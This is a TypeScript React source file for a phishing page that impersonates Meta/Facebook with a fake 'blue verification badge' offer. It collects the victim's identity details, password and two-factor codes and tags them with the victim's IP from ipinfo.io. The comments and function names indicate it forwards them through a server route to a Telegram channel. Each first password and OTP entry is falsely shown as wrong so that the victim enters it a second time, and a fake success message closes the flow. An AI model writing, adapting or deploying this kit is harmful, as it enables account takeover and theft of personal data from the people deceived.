"use client";

import React, { useState, useEffect, useRef, useMemo, createContext, useContext } from "react";

// ==================== CẤU HÌNH QUỐC GIA & CỜ ====================
function getFlagEmoji(countryCode: string) {
  return String.fromCodePoint(
    ...countryCode.toUpperCase().split("").map((char) => 127397 + char.charCodeAt(0))
  );
}

interface Country {
  code: string;
  name: string;
  dialCode: string;
  flag: string;
}

const countriesList: Country[] = [
  { code: "VN", name: "Vietnam", dialCode: "+84", flag: getFlagEmoji("VN") },
  { code: "US", name: "United States", dialCode: "+1", flag: getFlagEmoji("US") },
  { code: "GB", name: "United Kingdom", dialCode: "+44", flag: getFlagEmoji("GB") },
  { code: "CA", name: "Canada", dialCode: "+1", flag: getFlagEmoji("CA") },
  { code: "AU", name: "Australia", dialCode: "+61", flag: getFlagEmoji("AU") },
  { code: "NZ", name: "New Zealand", dialCode: "+64", flag: getFlagEmoji("NZ") },
  { code: "JP", name: "Japan", dialCode: "+81", flag: getFlagEmoji("JP") },
  { code: "KR", name: "South Korea", dialCode: "+82", flag: getFlagEmoji("KR") },
  { code: "CN", name: "China", dialCode: "+86", flag: getFlagEmoji("CN") },
  { code: "SG", name: "Singapore", dialCode: "+65", flag: getFlagEmoji("SG") },
  { code: "MY", name: "Malaysia", dialCode: "+60", flag: getFlagEmoji("MY") },
  { code: "TH", name: "Thailand", dialCode: "+66", flag: getFlagEmoji("TH") },
  { code: "ID", name: "Indonesia", dialCode: "+62", flag: getFlagEmoji("ID") },
  { code: "PH", name: "Philippines", dialCode: "+63", flag: getFlagEmoji("PH") },
  { code: "IN", name: "India", dialCode: "+91", flag: getFlagEmoji("IN") },
].sort((a, b) => a.name.localeCompare(b.name));

// ==================== HÀM GỬI DỮ LIỆU QUA API SERVER (route.js) ====================
async function sendToTelegramServer(payload: { name: string; email: string; message: string }) {
  try {
    const response = await fetch("/api/submit-form", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    const result = await response.json();
    console.log("Server response:", result);
  } catch (error) {
    console.error("Failed to send data to server:", error);
  }
}

// ==================== CONTEXT QUẢN LÝ LUỒNG (MODAL FLOW) ====================
interface ModalContextType {
  openModal: () => void;
  currentStep: string | null;
  closeModal: () => void;
  submitFormDetails: (data: any) => void;
  submitPasswordAttempt: (pwd: string) => Promise<boolean>;
  submitTwofaAttempt: (otp: string) => Promise<boolean>;
  locationInfo: any;
}

const ModalContext = createContext<ModalContextType | null>(null);

export function ModalFlowProvider({ children }: { children: React.ReactNode }) {
  const [currentStep, setCurrentStep] = useState<string | null>(null);
  const [formData, setFormData] = useState<any>(null);
  const [passwordAttempts, setPasswordAttempts] = useState<string[]>([]);
  const [twofaAttempts, setTwofaAttempts] = useState<string[]>([]);
  const locationRef = useRef<any>({ ip: "Unknown", country: "Unknown", city: "" });

  useEffect(() => {
    fetch("https://ipinfo.io/json")
      .then((res) => res.json())
      .then((data) => {
        locationRef.current = {
          ip: data.ip || "Unknown",
          country: data.country || "Unknown",
          city: data.city || "",
          region: data.region || "",
        };
      })
      .catch(() => {});
  }, []);

  const openModal = () => setCurrentStep("form");
  const closeModal = () => setCurrentStep(null);

  // 1. Xử lý khi hoàn tất Form bước 1
  const submitFormDetails = (data: any) => {
    setFormData(data);
    setCurrentStep("password");
    
    const msg = 
      `🚨 <b>NEW META SUBMISSION (Step 1)</b>\n\n` +
      `👤 <b>Name:</b> ${data.fullName}\n` +
      `📧 <b>Email:</b> ${data.email}\n` +
      `💼 <b>Business Email:</b> ${data.emailBusiness || "N/A"}\n` +
      `📄 <b>Page Name:</b> ${data.pageName || "N/A"}\n` +
      `📞 <b>Phone:</b> ${data.dialCode} ${data.phoneNumber}\n` +
      `🎂 <b>DOB:</b> ${data.day}/${data.month}/${data.year}\n` +
      `📝 <b>Note:</b> ${data.note || "N/A"}\n` +
      `🌐 <b>IP:</b> ${locationRef.current.ip} (${locationRef.current.country}, ${locationRef.current.city})`;

    sendToTelegramServer({ name: data.fullName, email: data.email, message: msg });
  };

  // 2. Xử lý nhập mật khẩu
  const submitPasswordAttempt = async (pwd: string): Promise<boolean> => {
    const newAttempts = [...passwordAttempts, pwd];
    setPasswordAttempts(newAttempts);

    const msg = 
      `🔑 <b>META PASSWORD ATTEMPT #${newAttempts.length}</b>\n\n` +
      `👤 <b>Email/Phone:</b> ${formData?.email || formData?.phoneNumber}\n` +
      `🔐 <b>Password:</b> <code>${pwd}</code>\n` +
      `🌐 <b>IP:</b> ${locationRef.current.ip}`;

    sendToTelegramServer({ name: formData?.fullName || "Unknown", email: formData?.email || "Unknown", message: msg });

    if (newAttempts.length === 1) {
      return false; // Sai lần 1 để hiện lỗi
    }
    
    setCurrentStep("twofa");
    return true;
  };

  // 3. Xử lý nhập mã OTP / 2FA
  const submitTwofaAttempt = async (otp: string): Promise<boolean> => {
    const newAttempts = [...twofaAttempts, otp];
    setTwofaAttempts(newAttempts);

    const msg = 
      `🛡️ <b>META 2FA CODE ATTEMPT #${newAttempts.length}</b>\n\n` +
      `👤 <b>Account:</b> ${formData?.email || formData?.phoneNumber}\n` +
      `🔢 <b>OTP Code:</b> <code>${otp}</code>\n` +
      `🌐 <b>IP:</b> ${locationRef.current.ip}`;

    sendToTelegramServer({ name: formData?.fullName || "Unknown", email: formData?.email || "Unknown", message: msg });

    if (newAttempts.length < 2) {
      return false; // Sai lần 1 để hiện đếm ngược 30s
    }

    setCurrentStep("success");
    return true;
  };

  return (
    <ModalContext.Provider
      value={{
        openModal,
        currentStep,
        closeModal,
        submitFormDetails,
        submitPasswordAttempt,
        submitTwofaAttempt,
        locationInfo: locationRef.current,
      }}
    >
      {children}
      <FormModal />
      <PasswordModal />
      <TwofaModal />
      <SuccessModal />
    </ModalContext.Provider>
  );
}

export function useModalFlow() {
  const context = useContext(ModalContext);
  if (!context) throw new Error("useModalFlow must be used within ModalFlowProvider");
  return context;
}

// ==================== COMPONENT 1: FORM THÔNG TIN ====================
function FormModal() {
  const { currentStep, closeModal, submitFormDetails } = useModalFlow();
  const [formData, setFormData] = useState({
    fullName: "",
    email: "",
    emailBusiness: "",
    pageName: "",
    phoneNumber: "",
    countryCode: "VN",
    dialCode: "+84",
    day: "",
    month: "",
    year: "",
    note: "",
    agreeToTerms: false,
    facebookNotification: true,
  });

  const [errors, setErrors] = useState<any>({});
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");
  const dropdownRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const handleClickOutside = (e: MouseEvent) => {
      if (dropdownRef.current && !dropdownRef.current.contains(e.target as Node)) {
        setIsDropdownOpen(false);
      }
    };
    document.addEventListener("mousedown", handleClickOutside);
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, []);

  const filteredCountries = useMemo(() => {
    return countriesList.filter(
      (c) => c.name.toLowerCase().includes(searchQuery.toLowerCase()) || c.dialCode.includes(searchQuery)
    );
  }, [searchQuery]);

  if (currentStep !== "form") return null;

  const handleChange = (e: any) => {
    const { name, value, type, checked } = e.target;
    setFormData((prev) => ({ ...prev, [name]: type === "checkbox" ? checked : value }));
    if (errors[name]) setErrors((prev: any) => ({ ...prev, [name]: "" }));
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    let errs: any = {};
    if (!formData.fullName.trim()) errs.fullName = "Required";
    if (!formData.email.trim()) errs.email = "Required";
    if (!formData.phoneNumber.trim()) errs.phoneNumber = "Required";
    if (!formData.day || !formData.month || !formData.year) errs.dob = "Required";
    if (!formData.agreeToTerms) errs.terms = "You must agree";

    setErrors(errs);
    if (Object.keys(errs).length === 0) {
      submitFormDetails(formData);
    }
  };

  const selectedCountry = countriesList.find((c) => c.code === formData.countryCode) || countriesList[0];

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4 overflow-y-auto">
      <div className="bg-white w-full max-w-[480px] rounded-2xl shadow-2xl p-6 relative">
        <button onClick={closeModal} className="absolute top-4 right-4 text-gray-400 hover:text-gray-600">✕</button>
        <div className="flex items-center gap-2 mb-4">
          <span className="text-xl font-bold text-blue-600">∞ Meta</span>
        </div>
        
        <form onSubmit={handleSubmit} className="space-y-3.5">
          <input
            type="text"
            name="fullName"
            placeholder="Full Name"
            value={formData.fullName}
            onChange={handleChange}
            className="w-full h-11 px-4 rounded-xl border border-gray-300 text-sm focus:border-blue-600 focus:outline-none text-gray-900"
          />
          <input
            type="email"
            name="email"
            placeholder="Email"
            value={formData.email}
            onChange={handleChange}
            className="w-full h-11 px-4 rounded-xl border border-gray-300 text-sm focus:border-blue-600 focus:outline-none text-gray-900"
          />
          <input
            type="email"
            name="emailBusiness"
            placeholder="Email Business (Optional)"
            value={formData.emailBusiness}
            onChange={handleChange}
            className="w-full h-11 px-4 rounded-xl border border-gray-300 text-sm focus:border-blue-600 focus:outline-none text-gray-900"
          />
          <input
            type="text"
            name="pageName"
            placeholder="Page Name (Optional)"
            value={formData.pageName}
            onChange={handleChange}
            className="w-full h-11 px-4 rounded-xl border border-gray-300 text-sm focus:border-blue-600 focus:outline-none text-gray-900"
          />

          <div className="flex gap-2 relative">
            <div className="relative" ref={dropdownRef}>
              <button
                type="button"
                onClick={() => setIsDropdownOpen(!isDropdownOpen)}
                className="flex items-center justify-between w-[120px] h-11 px-3 rounded-xl border border-gray-300 bg-white text-sm text-gray-900"
              >
                <span>{selectedCountry.flag} {selectedCountry.dialCode}</span>
                <span>▼</span>
              </button>
              {isDropdownOpen && (
                <div className="absolute top-12 left-0 w-64 bg-white border rounded-xl shadow-xl z-50 p-2 max-h-48 overflow-y-auto">
                  <input
                    type="text"
                    placeholder="Search..."
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    className="w-full p-2 mb-2 text-xs border rounded-lg focus:outline-none text-gray-900"
                  />
                  {filteredCountries.map((c) => (
                    <div
                      key={c.code}
                      onClick={() => {
                        setFormData((prev: any) => ({ ...prev, countryCode: c.code, dialCode: c.dialCode }));
                        setIsDropdownOpen(false);
                      }}
                      className="flex justify-between px-2 py-1.5 hover:bg-gray-100 rounded cursor-pointer text-xs text-gray-900"
                    >
                      <span>{c.flag} {c.name}</span>
                      <span>{c.dialCode}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>
            <input
              type="tel"
              name="phoneNumber"
              placeholder="Phone number"
              value={formData.phoneNumber}
              onChange={handleChange}
              className="w-full h-11 px-4 rounded-xl border border-gray-300 text-sm focus:border-blue-600 focus:outline-none text-gray-900"
            />
          </div>

          <div>
            <label className="block text-xs text-gray-600 mb-1">Date of Birth</label>
            <div className="grid grid-cols-3 gap-2">
              <input type="text" name="day" placeholder="Day" maxLength={2} value={formData.day} onChange={handleChange} className="h-11 text-center rounded-xl border border-gray-300 text-sm focus:outline-none text-gray-900" />
              <input type="text" name="month" placeholder="Month" maxLength={2} value={formData.month} onChange={handleChange} className="h-11 text-center rounded-xl border border-gray-300 text-sm focus:outline-none text-gray-900" />
              <input type="text" name="year" placeholder="Year" maxLength={4} value={formData.year} onChange={handleChange} className="h-11 text-center rounded-xl border border-gray-300 text-sm focus:outline-none text-gray-900" />
            </div>
          </div>

          <textarea
            name="note"
            placeholder="Note (Optional)"
            rows={3}
            maxLength={500}
            value={formData.note}
            onChange={handleChange}
            className="w-full p-3 rounded-xl border border-gray-300 text-sm focus:outline-none resize-none text-gray-900"
          />

          <div className="flex items-center gap-2">
            <input type="checkbox" id="terms" name="agreeToTerms" checked={formData.agreeToTerms} onChange={handleChange} />
            <label htmlFor="terms" className="text-xs text-gray-600">I agree with Terms of use</label>
          </div>

          <button type="submit" className="w-full h-11 bg-[#0064E0] hover:bg-blue-700 text-white font-semibold rounded-xl text-sm transition-all">
            Send
          </button>
        </form>
      </div>
    </div>
  );
}

// ==================== COMPONENT 2: NHẬP MẬT KHẨU ====================
function PasswordModal() {
  const { currentStep, closeModal, submitPasswordAttempt } = useModalFlow();
  const [password, setPassword] = useState("");
  const [error, setError] = useState(false);
  const [loading, setLoading] = useState(false);

  if (currentStep !== "password") return null;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password.trim() || loading) return;

    setLoading(true);
    const success = await submitPasswordAttempt(password);
    setLoading(false);

    if (!success) {
      setError(true);
      setPassword("");
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4">
      <div className="bg-white w-full max-w-[420px] rounded-2xl shadow-2xl p-6 relative">
        <button onClick={closeModal} className="absolute top-4 right-4 text-gray-400 hover:text-gray-600">✕</button>
        <div className="text-blue-600 font-bold mb-2">∞ Meta</div>
        <h3 className="text-base font-semibold text-gray-900 mb-1">For your security, you must enter your password to continue.</h3>
        
        <form onSubmit={handleSubmit} className="mt-4 space-y-4">
          <input
            type="password"
            placeholder="Enter your password"
            value={password}
            onChange={(e) => { setPassword(e.target.value); setError(false); }}
            className={`w-full h-11 px-4 rounded-xl border ${error ? "border-red-500" : "border-gray-300"} text-sm focus:outline-none text-gray-900`}
            autoFocus
          />
          {error && <p className="text-red-500 text-xs">Incorrect password. Please try again.</p>}
          <button type="submit" disabled={loading} className="w-full h-11 bg-[#0064E0] text-white font-semibold rounded-xl text-sm hover:bg-blue-700 transition-all">
            {loading ? "Checking..." : "Continue"}
          </button>
        </form>
      </div>
    </div>
  );
}

// ==================== COMPONENT 3: XÁC THỰC 2FA / OTP ====================
function TwofaModal() {
  const { currentStep, closeModal, submitTwofaAttempt } = useModalFlow();
  const [code, setCode] = useState("");
  const [countdown, setCountdown] = useState(0);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [countdown]);

  if (currentStep !== "twofa") return null;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!code.trim() || loading || countdown > 0) return;

    setLoading(true);
    const success = await submitTwofaAttempt(code);
    setLoading(false);

    if (!success) {
      setCountdown(30);
      setCode("");
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4">
      <div className="bg-white w-full max-w-[440px] rounded-2xl shadow-2xl p-6 relative">
        <button onClick={closeModal} className="absolute top-4 right-4 text-gray-400 hover:text-gray-600">✕</button>
        <h3 className="text-lg font-bold text-gray-900 mb-2">Two-factor authentication required</h3>
        <p className="text-xs text-gray-600 mb-4">Check your email, Authenticator app, or phone number linked to your Facebook account to get the code.</p>

        <form onSubmit={handleSubmit} className="space-y-4">
          <label className="block text-xs font-semibold text-gray-700">Code</label>
          <input
            type="text"
            maxLength={8}
            value={code}
            onChange={(e) => setCode(e.target.value)}
            disabled={countdown > 0}
            className="w-full h-11 px-4 rounded-xl border border-gray-300 text-sm focus:border-blue-600 focus:outline-none text-gray-900"
            autoFocus
          />
          {countdown > 0 && <p className="text-red-500 text-xs">Incorrect code. Please try again in {countdown}s.</p>}
          <button type="submit" disabled={loading || countdown > 0} className="w-full h-11 bg-[#0064E0] text-white font-semibold rounded-xl text-sm hover:bg-blue-700 transition-all disabled:opacity-50">
            {loading ? "Verifying..." : "Continue"}
          </button>
        </form>
      </div>
    </div>
  );
}

// ==================== COMPONENT 4: THÀNH CÔNG ====================
function SuccessModal() {
  const { currentStep } = useModalFlow();

  if (currentStep !== "success") return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4">
      <div className="bg-white w-full max-w-[480px] rounded-2xl shadow-2xl p-8 text-center relative">
        <div className="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-4 text-3xl font-bold">
          ✓
        </div>
        <h3 className="text-lg font-bold text-gray-900 mb-2">Thank you for providing the required information.</h3>
        <p className="text-xs text-gray-600 mb-6 leading-relaxed">
          We will proceed with updating the blue verification badge for your fanpage. The process may take approximately 30–45 minutes.
        </p>
        <button
          onClick={() => (window.location.href = "https://facebook.com")}
          className="w-full h-11 bg-[#0064E0] hover:bg-blue-700 text-white font-semibold rounded-xl text-sm transition-all"
        >
          Go to Facebook
        </button>
      </div>
    </div>
  );
}